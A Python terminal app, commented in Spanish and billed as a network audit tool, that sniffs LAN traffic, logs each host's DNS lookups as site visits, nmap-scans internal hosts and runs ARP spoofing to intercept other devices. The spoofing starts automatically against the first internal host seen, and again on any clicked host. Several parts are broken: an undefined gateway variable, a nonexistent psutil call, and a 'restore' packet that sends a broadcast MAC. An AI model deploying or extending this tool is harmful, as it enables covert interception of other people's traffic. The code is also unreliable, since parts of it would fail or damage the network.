import os
import sys
import threading
import subprocess
import socket
import ipaddress
from datetime import datetime
import time

# --- AUTO-INSTALACIÓN DE DEPENDENCIAS ---
def verificar_dependencias():
    librerias = ["textual", "scapy", "psutil"]
    for lib in librerias:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

verificar_dependencias()

import psutil
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, RichLog, Label, Button, ListItem, ListView
from textual.containers import Horizontal, Vertical
from textual.screen import ModalScreen
from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, ARP, send

# --- VENTANA DE DETALLES ---
class DetalleIPScreen(ModalScreen):
    def __init__(self, ip, info_nmap, historial):
        super().__init__()
        self.ip = ip
        self.info_nmap = info_nmap
        self.historial = historial

    def compose(self) -> ComposeResult:
        with Vertical(id="modal_container"):
            yield Label(f"AUDITORÍA DETALLADA: {self.ip}", id="modal_title")
            yield RichLog(id="modal_log", markup=True)
            yield Button("VOLVER (ESC)", variant="primary", id="close_btn")

    def on_mount(self):
        log = self.query_one("#modal_log")
        log.write(f"[bold cyan]>> RESULTADOS NMAP[/]\n{self.info_nmap}")
        log.write("\n[bold yellow]>> LOG COMPLETO DE EVENTOS[/]")
        if not self.historial: log.write("Sin actividad registrada.")
        for ev in self.historial: log.write(ev)
        self.victima_seleccionada = None

    def on_button_pressed(self, event: Button.Pressed): 
        self.app.pop_screen()

# --- APLICACIÓN PRINCIPAL ---
class SnifferTUI(App):
    BINDINGS = [
        ("q", "quit", "Salir"),
        ("e", "export", "Exportar"),
        ("s", "toggle_sniffer", "Iniciar/Parar")
    ]

    CSS = """
    Screen { layout: horizontal; }
    #sidebar { width: 30%; border-right: tall $primary; background: $surface; }
    #main_content { width: 70%; }
    .title { text-align: center; background: $primary; color: white; text-style: bold; padding: 1; }
    #controls { height: auto; border-top: solid $primary; padding: 1; align: center middle; }
    Button { margin: 1; width: 15; }
    #modal_container { width: 90%; height: 90%; background: $surface; border: thick $primary; padding: 2; }
    #modal_title { text-style: bold; color: $accent; margin-bottom: 1; }
    ListItem { padding: 0 1; }
    """

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Horizontal():
            with Vertical(id="sidebar"):
                yield Label(" INTERFACES ", classes="title")
                yield ListView(id="iface_list")
                yield Label(" DISPOSITIVOS (Click) ", classes="title")
                yield ListView(id="device_list")
            with Vertical(id="main_content"):
                yield Label(" MONITOR DE ACTIVIDAD ", classes="title")
                yield RichLog(id="event_log", markup=True)
                with Horizontal(id="controls"):
                    yield Button("START", id="start", variant="success")
                    yield Button("STOP", id="stop", variant="error")
                    yield Button("EXPORTAR", id="export_btn", variant="primary")
        yield Footer()

    def on_mount(self):
        self.sniffer_activo = False
        self.seen_ips = {}
        self.event_counters = {} 
        self.selected_interface = None
        self.connection_attempts = {}
        self.mi_ip = self.get_local_ip()
        
        iface_list = self.query_one("#iface_list")
        for iface in psutil.net_if_addrs().keys():
            iface_list.append(ListItem(Label(iface), id=iface))

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except: return "127.0.0.1"

    def es_ip_privada(self, ip):
        try:
            addr = ipaddress.ip_address(ip)
            return addr.is_private or addr.is_loopback
        except: return False

    def seguro_update(self, func, *args):
        if threading.current_thread() is threading.main_thread():
            func(*args)
        else:
            self.call_from_thread(func, *args)

    def registrar_evento(self, key, msg_base, categoria_color, ip_relacionada):
        log_widget = self.query_one("#event_log")
        if key not in self.event_counters:
            self.event_counters[key] = 1
            self.seguro_update(log_widget.write, f"[{categoria_color}]{msg_base}[/] (1 evento)")
        else:
            self.event_counters[key] += 1
            if self.event_counters[key] % 10 == 0 or "ids" in key:
                count = self.event_counters[key]
                self.seguro_update(log_widget.write, f"[bold yellow]ACTUALIZACIÓN:[/] [{categoria_color}]{msg_base}[/] ({count} eventos)")

        if ip_relacionada in self.seen_ips:
            hora = datetime.now().strftime('%H:%M:%S')
            self.seen_ips[ip_relacionada]["historial"].append(f"[{hora}] {msg_base}")

    def run_sniffer(self):
        def packet_callback(pkt):
            if not self.sniffer_activo or IP not in pkt: return
            src, dst = pkt[IP].src, pkt[IP].dst
            
            # OPTIMIZACIÓN: Solo procesar si es DNS o el inicio de una conexión TCP
            # Ignoramos los paquetes de datos pesados (Payloads)
            if not (pkt.haslayer(DNS) or (pkt.haslayer(TCP) and pkt[TCP].flags == "S")):
                return

            if src not in self.seen_ips: self.registrar_dispositivo(src)
            if dst not in self.seen_ips: self.registrar_dispositivo(dst)

            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                try:
                    qname = pkt[DNS].qd.qname.decode().strip(".")
                    if not qname.endswith(".local"):
                        key = f"dns_{src}_{qname}"
                    #self.registrar_evento(f"dns_{src}_{qname}", f"DNS: {src} busca {qname}", "magenta", src)
                    self.registrar_evento(key, f"VISITA: {src} -> https://{qname}", "bold magenta", src)
                except: pass
            elif pkt.haslayer(TCP) and pkt[TCP].flags == "S":
                self.registrar_evento(f"tcp_{src}_{dst}_{pkt[TCP].dport}", f"TCP: {src} -> {dst}:{pkt[TCP].dport}", "cyan", src)
            elif pkt.haslayer(ICMP):
                self.registrar_evento(f"icmp_{src}_{dst}", f"ICMP: {src} -> {dst} (Ping)", "yellow", src)

            # IDS
            if src != self.mi_ip and self.es_ip_privada(src):
                if src not in self.connection_attempts: self.connection_attempts[src] = set()
                if TCP in pkt: self.connection_attempts[src].add(pkt[TCP].dport)
                if len(self.connection_attempts[src]) > 15:
                    self.registrar_evento(f"ids_{src}", f"ALERTA IDS: Escaneo desde {src}", "bold red", src)

        sniff(iface=self.selected_interface, prn=packet_callback, store=0, promisc=True, stop_filter=lambda x: not self.sniffer_activo)

    def obtener_gateway_ip(self):
        try:
            gateways = psutil.net_gateway()
            # Retorna la IP del gateway de la interfaz por defecto (AF_INET)
            return gateways['default'][psutil.AF_INET][0]
        except Exception:
            # Si falla, intenta una IP común, pero lo ideal es el autodescubrimiento
            return "10.0.2.1"

    def realizar_arp_spoofing(self, objetivo_ip, gateway_ip):
        # Guardamos quién es el objetivo de este hilo específico
        hilo_objetivo = objetivo_ip
        
        # Paquetes de envenenamiento
        paquete_victima = ARP(op=2, pdst=objetivo_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        paquete_router = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=objetivo_ip)
        
        self.seguro_update(self.query_one("#event_log").write, f"[bold red]ATAQUE INICIADO:[/] {objetivo_ip}")

        # El bucle solo sigue si el sniffer está activo Y esta IP sigue siendo la seleccionada
        while self.sniffer_activo and self.victima_seleccionada == hilo_objetivo:
            try:
                send(paquete_victima, verbose=False)
                send(paquete_router, verbose=False)
                time.sleep(4)
            except Exception:
                break
        
        # --- RESTAURACIÓN ---
        # Si salimos del bucle (porque cambiamos de víctima o dimos a STOP), limpiamos la red
        self.seguro_update(self.query_one("#event_log").write, f"[bold yellow]RESTAURANDO:[/] {hilo_objetivo} ha sido liberado.")
        
        # Enviamos paquetes ARP con la información real (MAC broadcast) para re-mapear las tablas ARP
        paquete_fix = ARP(op=2, pdst=objetivo_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
        send(paquete_fix, count=5, verbose=False)

    def registrar_dispositivo(self, ip, es_mio=False):
        if ip in self.seen_ips: return
        
        privada = self.es_ip_privada(ip)
        tag = "(LOCAL)" if es_mio else ("(INTERNO)" if privada else "(EXTERNO)")
        
        # Ahora permitimos el escaneo si es privada, INCLUYENDO la nuestra
        status_nmap = "(ESCANEANDO...)" if privada else "Listo"
        info_nmap = "Analizando puertos..." if privada else "Análisis omitido (IP Externa)"
        
        lbl = Label(f"IP: {ip} [yellow]{tag}[/] [green]{status_nmap}[/]")
        self.seen_ips[ip] = {"nmap": info_nmap, "widget": lbl, "historial": []}
        lv = self.query_one("#device_list")
        self.seguro_update(lv.append, ListItem(lbl))
        
        if privada:
            threading.Thread(target=self.scan, args=(ip,), daemon=True).start()

    def scan(self, ip):
        try:
            # -T4 y -F para velocidad. Si es nuestra IP local, suele ser casi instantáneo.
            # Añadimos -O para Sistema Operativo y -sV para servicios
            # Nota: -O requiere privilegios de administrador/root
            res = subprocess.run(["nmap", "-sV", "-O", "-T4", "-F", ip], capture_output=True, text=True, timeout=60)
            self.seen_ips[ip]["nmap"] = res.stdout if res.stdout else "No se detectaron servicios."
            
            # Recuperar el tag para actualizar el label correctamente
            es_mio = (ip == self.mi_ip)
            tag = "(LOCAL)" if es_mio else ("(INTERNO)" if self.es_ip_privada(ip) else "(EXTERNO)")
            self.seguro_update(self.seen_ips[ip]["widget"].update, f"IP: {ip} [yellow]{tag}[/] [bold green](LISTO)[/]")
        except:
            self.seen_ips[ip]["nmap"] = "Error en el escaneo."

    def start_sniffer(self):
        if not self.selected_interface:
            self.query_one("#event_log").write("[bold red]ERROR: Selecciona una interfaz primero.[/]")
            return
        if not self.sniffer_activo:
            self.sniffer_activo = True
            self.query_one("#event_log").write("[bold green]START: MONITOREO ACTIVADO[/]")
            
            # Forzamos el registro y escaneo de nuestra propia IP al inicio
            self.registrar_dispositivo(self.mi_ip, True)
            
            threading.Thread(target=self.run_sniffer, daemon=True).start()

            # 2. Hilo Lanzador de ARP Dinámico
            # Creamos una pequeña función interna que espere a ver una IP objetivo
            def lanzador_dinamico():
                while self.sniffer_activo:
                    # Buscamos una IP en la lista que sea interna y no seamos nosotros
                    objetivo = None
                    for ip in self.seen_ips:
                        if ip != self.mi_ip and self.es_ip_privada(ip):
                            objetivo = ip
                            break
                    
                    if objetivo:
                        self.seguro_update(self.query_one("#event_log").write, f"[bold cyan]INTERCEPTANDO:[/] Objetivo detectado -> {objetivo}")
                        self.realizar_arp_spoofing(objetivo, gateway)
                        break
                    time.sleep(2)

            threading.Thread(target=lanzador_dinamico, daemon=True).start()

    def stop_sniffer(self):
        self.sniffer_activo = False
        self.query_one("#event_log").write("[bold yellow]STOP: MONITOREO DETENIDO[/]")

    def exportar_reporte(self):
        folder = "Auditorias_Red"
        if not os.path.exists(folder): os.makedirs(folder)
        path = os.path.join(folder, f"Reporte_{datetime.now().strftime('%H%M%S')}.txt")
        with open(path, "w") as f:
            f.write(f"REPORTE AUDITORIA - {datetime.now()}\n\n")
            for ip, d in self.seen_ips.items():
                f.write(f"HOST: {ip}\n{d['nmap']}\n" + "-"*30 + "\n")
        self.query_one("#event_log").write(f"[bold green]INFORME EXPORTADO:[/] {path}")

    def on_list_view_selected(self, event: ListView.Selected) -> None:
        if event.list_view.id == "iface_list":
            self.selected_interface = event.item.id
        elif event.list_view.id == "device_list":
            try:
                # Usamos .render() en lugar de .renderable para obtener el texto
                label_widget = event.item.children[0]
                label_text = str(label_widget.render()) 
                
                # Extraemos la IP de forma más robusta
                target_ip = label_text.split("IP: ")[1].split(" ")[0]
                
                # 1. Si es nuestra propia IP, solo mostramos detalles
                if target_ip == self.mi_ip:
                    data = self.seen_ips[target_ip]
                    self.push_screen(DetalleIPScreen(target_ip, data["nmap"], data["historial"]))
                    return

                # 2. Si es una IP interna ajena, fijamos objetivo e interceptamos
                if self.es_ip_privada(target_ip):
                    self.victima_seleccionada = target_ip
                    gateway = self.obtener_gateway_ip()
                    
                    self.query_one("#event_log").write(f"[bold red]OBJETIVO FIJADO:[/] Interceptando {target_ip}")
                    
                    threading.Thread(
                        target=self.realizar_arp_spoofing, 
                        args=(target_ip, gateway), 
                        daemon=True
                    ).start()
                    
                    # Abrir detalles
                    data = self.seen_ips[target_ip]
                    self.push_screen(DetalleIPScreen(target_ip, data["nmap"], data["historial"]))
            
            except Exception as e:
                self.query_one("#event_log").write(f"[bold red]ERROR al seleccionar:[/] {str(e)}")

    def on_button_pressed(self, event):
        if event.button.id == "start": self.start_sniffer()
        elif event.button.id == "stop": self.stop_sniffer()
        elif event.button.id == "export_btn": self.exportar_reporte()

    def action_toggle_sniffer(self): self.start_sniffer() if not self.sniffer_activo else self.stop_sniffer()
    def action_export(self): self.exportar_reporte()

if __name__ == "__main__":
    if os.name != 'nt' and os.getuid() != 0:
        print("ERROR: Ejecute con sudo.")
    else:
        SnifferTUI().run()